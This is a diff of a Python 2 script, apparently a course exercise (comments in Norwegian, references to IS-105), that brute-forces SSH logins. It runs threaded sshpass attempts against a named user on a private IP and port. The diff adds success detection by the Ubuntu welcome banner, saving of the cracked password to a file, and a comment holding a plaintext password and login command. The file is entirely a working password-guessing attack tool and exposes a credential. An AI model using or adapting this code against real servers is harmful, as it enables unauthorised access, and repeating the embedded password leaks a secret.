@@ -2,9 +2,7 @@
 # 32-126 : 20-7E
 # Tråder: https://docs.python.org/2/library/threading.html
 # Queue: https://www.troyfawkes.com/learn-python-multithreading-queues-basics/
-
 import threading
-import time
 import commands
 
 p = 1
@@ -12,22 +10,32 @@ USERNAME = "sigurdkb"
 IP_ADRESS = "10.225.147.156"
 PORT = "2222"
 new_results = []
+correct_pw = ""
+# sshpass -p bkdrugis ssh Sigurdkb@10.225.147.156 -p 2222
 
 def connect_ssh(pw_list):
+        global correct_pw
+
         for n in pw_list:
             # Lagrer resultatene fra kommando i variabel
             result = commands.getoutput("sshpass -p " + n + " ssh "+ USERNAME + "@" + IP_ADRESS + " -p " + PORT)
 
             # Dersom result inneholder permission denied prøver tråden neste passord
             if result.__contains__("Permission denied"):
-                print "Prøvd passord: " + n
+                print "Password try: " + n
+            elif result.__contains__("Welcome to Ubuntu"): # Fra IS-105 UH-IAAS (samme velkomst (også Ubuntu-server))
+                print "Correct password: " + n
+                correct_pw = n
+                f = open("correct_pw.txt", 'w')
+                f.write(correct_pw)
+                exit(0)
+
             else:
             # Dersom result ikke ennholder permission denied legger den passordet i en liste sammen med andre passord som ligger der av samme grunn
                 print "Passord som gav nytt resultat: " + n
                 print " Output: " + result
                 new_results.append(n)
                 print new_results
-                break
 
 
 # Funksjon for å fordele passordene i noenlunde like lister (sekvensielt)
